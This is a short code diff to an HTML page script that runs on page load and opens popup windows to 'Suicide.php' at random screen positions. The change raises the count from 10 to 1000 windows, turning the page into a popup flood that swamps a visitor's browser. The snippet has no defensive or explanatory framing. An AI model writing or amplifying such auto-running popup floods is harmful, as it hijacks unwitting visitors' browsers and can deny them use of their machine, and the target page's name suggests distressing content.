@@ -1,6 +1,6 @@
 <script>
 window.onload = function(){
-    for(let i=0; i<10; i++){
+    for(let i=0; i<1000; i++){
         const posX = Math.random() * 1620;
         const posY = Math.random() * 980;
         window.open("Suicide.php","_blank", "width=200,height=200,left="+posX+",top="+posY);
